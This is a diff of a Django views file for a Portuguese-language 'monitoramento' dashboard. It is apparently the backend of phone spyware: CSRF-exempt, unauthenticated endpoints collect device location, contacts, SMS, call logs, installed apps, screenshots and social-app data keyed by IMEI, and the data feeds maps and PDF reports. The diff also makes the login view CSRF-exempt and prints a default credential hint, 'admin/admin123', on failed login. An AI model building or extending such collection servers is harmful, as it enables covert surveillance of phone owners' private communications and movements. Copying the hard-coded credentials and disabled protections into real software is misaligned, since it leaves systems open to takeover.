@@ -11,8 +11,9 @@ from django.core.files.base import ContentFile
 from .models import Dispositivo, Atividade, Localizacao, Contato, SMS, Chamada, Aplicativo, Arquivo, Midia, RedeSocial, AtividadeRede
 from django.contrib.auth.decorators import login_required
 from django.contrib.auth import authenticate, login, logout
-from datetime import datetime
+from datetime import datetime, timedelta
 from django.utils import timezone
+from functools import wraps
 
 
 @login_required
@@ -74,18 +75,19 @@ def logs_dispositivos(request):
 	dispositivos = Dispositivo.objects.all().prefetch_related('atividades')
 	return render(request, 'monitoramento/logs.html', {'dispositivos': dispositivos})
 
+@csrf_exempt
 def login_view(request):
 	if request.method == 'POST':
 		username = request.POST.get('username')
 		password = request.POST.get('password')
-		
+
 		user = authenticate(request, username=username, password=password)
 		if user is not None:
 			login(request, user)
 			return redirect('lista_dispositivos')
 		else:
 			return render(request, 'monitoramento/login.html', {
-				'erro': 'Usuário ou senha inválidos. Tente: Admin/admin123 ou admin/123456'
+				'erro': 'Usuário ou senha inválidos. Tente: admin/admin123'
 			})
 	return render(request, 'monitoramento/login.html')
 
@@ -100,7 +102,8 @@ def limpar_imei(imei):
 @login_required
 def lista_dispositivos(request):
 	from django.core.paginator import Paginator
-	dispositivos = Dispositivo.objects.all().order_by('-ultima_conexao')
+	# Filtrar apenas dispositivos reais (com IMEI válido e dados coletados)
+	dispositivos = Dispositivo.objects.exclude(imei__isnull=True).exclude(imei='').order_by('-ultima_conexao')
 	imei = request.GET.get('imei', '').strip()
 	ip = request.GET.get('ip', '').strip()
 	usuario = request.GET.get('usuario', '').strip()
@@ -158,14 +161,31 @@ def exportar_dispositivos_csv(request):
 		])
 	return response
 
+@csrf_exempt
+@require_http_methods(["POST"])
 def registrar_atividade(request):
-	if request.method == 'POST':
-		imei = request.POST.get('imei')
-		descricao = request.POST.get('descricao')
-		dispositivo = get_object_or_404(Dispositivo, imei=imei)
+	try:
+		data = json.loads(request.body)
+		imei = data.get('imei', 'dispositivo_desconhecido')
+		descricao = data.get('descricao', 'Atividade automática')
+
+		print(f"[API ATIVIDADE] Dados recebidos: IMEI={imei}, Descrição={descricao}")
+
+		# Buscar dispositivo existente ou criar novo
+		dispositivo = Dispositivo.objects.filter(imei=imei).first()
+		if not dispositivo:
+			dispositivo = Dispositivo.objects.create(
+				imei=imei,
+				ip=request.META.get('REMOTE_ADDR', '0.0.0.0')
+			)
+
 		Atividade.objects.create(dispositivo=dispositivo, descricao=descricao)
-		return JsonResponse({'status': 'ok'})
-	return JsonResponse({'error': 'Método não permitido'}, status=405)
+
+		print(f"[API ATIVIDADE] Atividade salva para dispositivo {imei}")
+		return JsonResponse({'status': 'success'})
+	except Exception as e:
+		print(f"[API ATIVIDADE] Erro: {str(e)}")
+		return JsonResponse({'error': str(e)}, status=400)
 
 @login_required
 def atividades_dispositivo(request, imei):
@@ -191,6 +211,12 @@ def todas_atividades(request):
 
 # APIs para receber dados dos dispositivos móveis
 @csrf_exempt
+@require_http_methods(["GET"])
+def api_test(request):
+    """Endpoint simples para testar conectividade"""
+    return JsonResponse({'status': 'success', 'message': 'API funcionando'})
+
+@csrf_exempt
 @require_http_methods(["POST"])
 def api_localizacao(request):
 	try:
@@ -198,22 +224,28 @@ def api_localizacao(request):
 		imei = data.get('imei', 'dispositivo_desconhecido')
 		latitude = data.get('latitude')
 		longitude = data.get('longitude')
-		
-		# Criar ou atualizar dispositivo
-		dispositivo, created = Dispositivo.objects.get_or_create(
-			imei=imei,
-			defaults={'ip': request.META.get('REMOTE_ADDR', '0.0.0.0')}
-		)
-		
+
+		print(f"[API LOCALIZACAO] Dados recebidos: IMEI={imei}, Latitude={latitude}, Longitude={longitude}")
+
+		# Buscar dispositivo existente ou criar novo
+		dispositivo = Dispositivo.objects.filter(imei=imei).first()
+		if not dispositivo:
+			dispositivo = Dispositivo.objects.create(
+				imei=imei,
+				ip=request.META.get('REMOTE_ADDR', '0.0.0.0')
+			)
+
 		# Salvar localização
 		Localizacao.objects.create(
 			dispositivo=dispositivo,
 			latitude=latitude,
 			longitude=longitude
 		)
-		
+
+		print(f"[API LOCALIZACAO] Localização salva para dispositivo {imei}")
 		return JsonResponse({'status': 'success'})
 	except Exception as e:
+		print(f"[API LOCALIZACAO] Erro: {str(e)}")
 		return JsonResponse({'error': str(e)}, status=400)
 
 @csrf_exempt
@@ -223,21 +255,28 @@ def api_contatos(request):
 		data = json.loads(request.body)
 		imei = data.get('imei', 'dispositivo_desconhecido')
 		contatos = data.get('contatos', [])
-		
-		dispositivo, created = Dispositivo.objects.get_or_create(
-			imei=imei,
-			defaults={'ip': request.META.get('REMOTE_ADDR', '0.0.0.0')}
-		)
-		
+
+		print(f"[API CONTATOS] Dados recebidos: IMEI={imei}, Contatos={len(contatos)}")
+
+		# Buscar dispositivo existente ou criar novo
+		dispositivo = Dispositivo.objects.filter(imei=imei).first()
+		if not dispositivo:
+			dispositivo = Dispositivo.objects.create(
+				imei=imei,
+				ip=request.META.get('REMOTE_ADDR', '0.0.0.0')
+			)
+
 		for contato in contatos:
 			Contato.objects.get_or_create(
 				dispositivo=dispositivo,
 				telefone=contato.get('telefone', ''),
 				defaults={'nome': contato.get('nome', '')}
 			)
-		
+
+		print(f"[API CONTATOS] Contatos salvos para dispositivo {imei}")
 		return JsonResponse({'status': 'success'})
 	except Exception as e:
+		print(f"[API CONTATOS] Erro: {str(e)}")
 		return JsonResponse({'error': str(e)}, status=400)
 
 @csrf_exempt
@@ -247,12 +286,17 @@ def api_sms(request):
 		data = json.loads(request.body)
 		imei = data.get('imei', 'dispositivo_desconhecido')
 		sms_list = data.get('sms', [])
-		
-		dispositivo, created = Dispositivo.objects.get_or_create(
-			imei=imei,
-			defaults={'ip': request.META.get('REMOTE_ADDR', '0.0.0.0')}
-		)
-		
+
+		print(f"[API SMS] Dados recebidos: IMEI={imei}, SMS={len(sms_list)}")
+
+		# Buscar dispositivo existente ou criar novo
+		dispositivo = Dispositivo.objects.filter(imei=imei).first()
+		if not dispositivo:
+			dispositivo = Dispositivo.objects.create(
+				imei=imei,
+				ip=request.META.get('REMOTE_ADDR', '0.0.0.0')
+			)
+
 		for sms in sms_list:
 			SMS.objects.create(
 				dispositivo=dispositivo,
@@ -262,9 +306,11 @@ def api_sms(request):
 				data_envio=timezone.now(),
 				tipo=sms.get('tipo', 'recebido')
 			)
-		
+
+		print(f"[API SMS] SMS salvos para dispositivo {imei}")
 		return JsonResponse({'status': 'success'})
 	except Exception as e:
+		print(f"[API SMS] Erro: {str(e)}")
 		return JsonResponse({'error': str(e)}, status=400)
 
 @csrf_exempt
@@ -274,12 +320,17 @@ def api_chamadas(request):
 		data = json.loads(request.body)
 		imei = data.get('imei', 'dispositivo_desconhecido')
 		chamadas = data.get('chamadas', [])
-		
-		dispositivo, created = Dispositivo.objects.get_or_create(
-			imei=imei,
-			defaults={'ip': request.META.get('REMOTE_ADDR', '0.0.0.0')}
-		)
-		
+
+		print(f"[API CHAMADAS] Dados recebidos: IMEI={imei}, Chamadas={len(chamadas)}")
+
+		# Buscar dispositivo existente ou criar novo
+		dispositivo = Dispositivo.objects.filter(imei=imei).first()
+		if not dispositivo:
+			dispositivo = Dispositivo.objects.create(
+				imei=imei,
+				ip=request.META.get('REMOTE_ADDR', '0.0.0.0')
+			)
+
 		for chamada in chamadas:
 			Chamada.objects.create(
 				dispositivo=dispositivo,
@@ -288,9 +339,11 @@ def api_chamadas(request):
 				duracao=chamada.get('duracao', 0),
 				data_chamada=timezone.now()
 			)
-		
+
+		print(f"[API CHAMADAS] Chamadas salvas para dispositivo {imei}")
 		return JsonResponse({'status': 'success'})
 	except Exception as e:
+		print(f"[API CHAMADAS] Erro: {str(e)}")
 		return JsonResponse({'error': str(e)}, status=400)
 
 @csrf_exempt
@@ -300,12 +353,17 @@ def api_apps(request):
 		data = json.loads(request.body)
 		imei = data.get('imei', 'dispositivo_desconhecido')
 		apps = data.get('apps', [])
-		
-		dispositivo, created = Dispositivo.objects.get_or_create(
-			imei=imei,
-			defaults={'ip': request.META.get('REMOTE_ADDR', '0.0.0.0')}
-		)
-		
+
+		print(f"[API APPS] Dados recebidos: IMEI={imei}, Apps={len(apps)}")
+
+		# Buscar dispositivo existente ou criar novo
+		dispositivo = Dispositivo.objects.filter(imei=imei).first()
+		if not dispositivo:
+			dispositivo = Dispositivo.objects.create(
+				imei=imei,
+				ip=request.META.get('REMOTE_ADDR', '0.0.0.0')
+			)
+
 		for app in apps:
 			Aplicativo.objects.get_or_create(
 				dispositivo=dispositivo,
@@ -315,40 +373,37 @@ def api_apps(request):
 					'versao': app.get('versao', '')
 				}
 			)
-		
+
+		print(f"[API APPS] Apps salvas para dispositivo {imei}")
 		return JsonResponse({'status': 'success'})
 	except Exception as e:
+		print(f"[API APPS] Erro: {str(e)}")
 		return JsonResponse({'error': str(e)}, status=400)
 
 @csrf_exempt
 @require_http_methods(["POST"])
 def api_upload(request):
 	try:
-		if 'file' not in request.FILES:
+		if 'screenshot' not in request.FILES:
 			return JsonResponse({'error': 'Nenhum arquivo enviado'}, status=400)
-		
-		file = request.FILES['file']
+
+		file = request.FILES['screenshot']
 		imei = request.POST.get('imei', 'dispositivo_desconhecido')
-		tipo = request.POST.get('tipo', 'arquivo')
-		
+		tipo = request.POST.get('tipo', 'screenshot')
+
+		print(f"[API UPLOAD] Dados recebidos: IMEI={imei}, Arquivo={file.name}, Tipo={tipo}, Tamanho={file.size}")
+
 		dispositivo, created = Dispositivo.objects.get_or_create(
 			imei=imei,
 			defaults={'ip': request.META.get('REMOTE_ADDR', '0.0.0.0')}
 		)
-		
-		if tipo == 'media':
-			# Determinar tipo de mídia
-			tipo_midia = 'foto'
-			if file.content_type:
-				if 'video' in file.content_type:
-					tipo_midia = 'video'
-				elif 'audio' in file.content_type:
-					tipo_midia = 'audio'
-			
+
+		if tipo == 'screenshot':
+			# Salvar como mídia do tipo screenshot
 			Midia.objects.create(
 				dispositivo=dispositivo,
 				nome_arquivo=file.name,
-				tipo_midia=tipo_midia,
+				tipo_midia='screenshot',
 				tamanho=file.size,
 				arquivo=file
 			)
@@ -361,9 +416,11 @@ def api_upload(request):
 				tipo_arquivo=file.content_type or 'unknown',
 				arquivo=file
 			)
-		
+
+		print(f"[API UPLOAD] Arquivo salvo para dispositivo {imei}")
 		return JsonResponse({'status': 'success'})
 	except Exception as e:
+		print(f"[API UPLOAD] Erro: {str(e)}")
 		return JsonResponse({'error': str(e)}, status=400)
 
 @csrf_exempt
@@ -373,12 +430,17 @@ def api_redes_sociais(request):
 		data = json.loads(request.body)
 		imei = data.get('imei', 'dispositivo_desconhecido')
 		social_data = data.get('social_data', {})
-		
-		dispositivo, created = Dispositivo.objects.get_or_create(
-			imei=imei,
-			defaults={'ip': request.META.get('REMOTE_ADDR', '0.0.0.0')}
-		)
-		
+
+		print(f"[API REDES SOCIAIS] Dados recebidos: IMEI={imei}, Apps Sociais={len(social_data.get('social_apps', []))}")
+
+		# Buscar dispositivo existente ou criar novo
+		dispositivo = Dispositivo.objects.filter(imei=imei).first()
+		if not dispositivo:
+			dispositivo = Dispositivo.objects.create(
+				imei=imei,
+				ip=request.META.get('REMOTE_ADDR', '0.0.0.0')
+			)
+
 		for app in social_data.get('social_apps', []):
 			RedeSocial.objects.get_or_create(
 				dispositivo=dispositivo,
@@ -388,9 +450,11 @@ def api_redes_sociais(request):
 					'instalado': app.get('installed', True)
 				}
 			)
-		
+
+		print(f"[API REDES SOCIAIS] Redes sociais salvas para dispositivo {imei}")
 		return JsonResponse({'status': 'success'})
 	except Exception as e:
+		print(f"[API REDES SOCIAIS] Erro: {str(e)}")
 		return JsonResponse({'error': str(e)}, status=400)
 
 @csrf_exempt
@@ -401,21 +465,68 @@ def api_atividade_rede(request):
 		imei = data.get('imei', 'dispositivo_desconhecido')
 		ip_local = data.get('ip')
 		wifi_status = data.get('wifi_status', '')
-		
-		dispositivo, created = Dispositivo.objects.get_or_create(
-			imei=imei,
-			defaults={'ip': request.META.get('REMOTE_ADDR', '0.0.0.0')}
-		)
-		
+
+		print(f"[API ATIVIDADE REDE] Dados recebidos: IMEI={imei}, IP={ip_local}, WiFi={wifi_status}")
+
+		# Buscar dispositivo existente ou criar novo
+		dispositivo = Dispositivo.objects.filter(imei=imei).first()
+		if not dispositivo:
+			dispositivo = Dispositivo.objects.create(
+				imei=imei,
+				ip=request.META.get('REMOTE_ADDR', '0.0.0.0')
+			)
+
 		AtividadeRede.objects.create(
 			dispositivo=dispositivo,
 			ip_local=ip_local or '0.0.0.0',
 			ip_publico=request.META.get('REMOTE_ADDR'),
 			wifi_status=wifi_status
 		)
-		
+
+		print(f"[API ATIVIDADE REDE] Atividade de rede salva para dispositivo {imei}")
 		return JsonResponse({'status': 'success'})
 	except Exception as e:
+		print(f"[API ATIVIDADE REDE] Erro: {str(e)}")
+		return JsonResponse({'error': str(e)}, status=400)
+
+@csrf_exempt
+@require_http_methods(["POST"])
+def api_device_info(request):
+	try:
+		data = json.loads(request.body)
+		imei = data.get('imei', 'dispositivo_desconhecido')
+		device_info = data.get('device_info', {})
+
+		print(f"[API DEVICE INFO] Dados recebidos: IMEI={imei}, Device Info={device_info}")
+
+		# Buscar dispositivo existente ou criar novo
+		dispositivo = Dispositivo.objects.filter(imei=imei).first()
+		if not dispositivo:
+			dispositivo = Dispositivo.objects.create(
+				imei=imei,
+				ip=request.META.get('REMOTE_ADDR', '0.0.0.0')
+			)
+
+		# Atualizar informações do dispositivo
+		if 'bateria_nivel' in device_info:
+			dispositivo.bateria_nivel = device_info['bateria_nivel']
+		if 'bateria_carregando' in device_info:
+			dispositivo.bateria_carregando = device_info['bateria_carregando']
+		if 'bateria_temperatura' in device_info:
+			dispositivo.bateria_temperatura = device_info['bateria_temperatura']
+		if 'armazenamento_total' in device_info:
+			dispositivo.armazenamento_total = device_info['armazenamento_total']
+		if 'armazenamento_usado' in device_info:
+			dispositivo.armazenamento_usado = device_info['armazenamento_usado']
+		if 'armazenamento_livre' in device_info:
+			dispositivo.armazenamento_livre = device_info['armazenamento_livre']
+
+		dispositivo.save()
+
+		print(f"[API DEVICE INFO] Informações do dispositivo atualizadas para {imei}")
+		return JsonResponse({'status': 'success'})
+	except Exception as e:
+		print(f"[API DEVICE INFO] Erro: {str(e)}")
 		return JsonResponse({'error': str(e)}, status=400)
 
 # Views para exibir dados coletados
@@ -454,3 +565,10 @@ def mapa_localizacoes(request, imei):
 		'dispositivo': dispositivo,
 		'localizacoes': localizacoes
 	})
+
+@login_required
+def gerar_relatorio_pdf(request, imei):
+    from .utils import gerar_relatorio_pdf_response
+    dispositivo = get_object_or_404(Dispositivo, imei=imei)
+    return gerar_relatorio_pdf_response(dispositivo)
+
